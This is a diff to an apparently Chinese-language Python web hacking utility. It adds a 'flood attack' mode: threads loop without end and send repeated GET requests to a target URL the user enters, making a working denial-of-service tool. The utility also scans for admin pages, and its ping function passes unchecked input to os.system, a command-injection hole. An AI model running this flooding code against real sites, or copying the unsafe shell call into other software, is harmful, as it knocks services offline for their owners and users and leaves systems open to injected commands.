@@ -14,7 +14,7 @@ name = """_ _                 _
 print(name)
 print("="*45)
 print("开源地址:https://github.com/yourmoln/moligeek")
-print("本工具仅限于合法用途")
+print("本工具仅限于合法用途，交流Q群:564136017")
 print("="*45)
 
 import os
@@ -57,9 +57,11 @@ else:
     ssl="https://"
 name=input("请输入链接:"+ssl)
 url=ssl+name
-mode=input("请选择模式:\n(1)下载源码\n(2)ping\n(3)获取ip\n(4)提交表单\n(5)后台扫描\n")
+mode=input("请选择模式:\n(1)下载源码\n(2)ping\n(3)获取ip\n(4)提交表单\n(5)后台扫描\n(6)洪水攻击\n")
 
-#获取源码并写入
+
+
+#下载源码
 def getsrc():
     try:
         response=requests.get(url,headers)
@@ -73,9 +75,13 @@ def getsrc():
     except:
         print("写入失败\n请检查网络是否正常或网页是否存在")
 
+
+
 #ping
 def ping():
     os.system("ping "+name)
+
+
 
 #获取ip
 def getip():
@@ -83,6 +89,8 @@ def getip():
         print("ip:"+gethostbyname(name))
     except:
         print("未检测到ip\n请检查网络是否正常或域名是否正确")
+
+
 
 #提交表单
 def upform():
@@ -102,6 +110,24 @@ def upform():
         get()
     else:
         post()
+
+def post():
+    try:
+        response = requests.post(url, data=formdata)
+        response.encoding="utf–8"
+        print(response.text)
+    except:
+        print("发送失败\n请检查网络是否正常或页面是否存在")
+
+def get():
+    try:
+        response = requests.get(url, params=formdata)
+        response.encoding="utf–8"
+        print(response.text)
+    except:
+        print("发送失败\n请检查网络是否正常或页面是否存在")
+
+
 
 #后台文件扫描
 def findadmin():
@@ -167,6 +193,27 @@ def shaomiao(i):
         #f=f+1
         return 0
     
+
+
+#洪水攻击
+def startattack():
+    n=0
+    speed=int(input("请输入攻击速度(小心卡死自己):"))
+    while 1:
+        n+=speed
+        t1 = threading.Thread(target=attack,args=(speed,))
+        t1.start()
+        print(f"\r已发送{n}个包",end="")
+def attack(speed):
+    while speed>0:
+        try:
+            response = requests.get(url,headers)
+        except:
+            #print("发送失败")
+            break
+        speed-=1
+        
+        
 #判断模式
 if mode in ["1","获取源码"]:
     getsrc()
@@ -178,20 +225,5 @@ if mode in ["4","提交表单"]:
     upform()
 if mode in ["5","后台扫描"]:
     findadmin()
-    
-    
-def post():
-    try:
-        response = requests.post(url, data=formdata)
-        response.encoding="utf–8"
-        print(response.text)
-    except:
-        print("发送失败\n请检查网络是否正常或页面是否存在")
-        
-def get():
-    try:
-        response = requests.get(url, params=formdata)
-        response.encoding="utf–8"
-        print(response.text)
-    except:
-        print("发送失败\n请检查网络是否正常或页面是否存在")
+if mode in ["6","洪水攻击"]:
+    startattack()
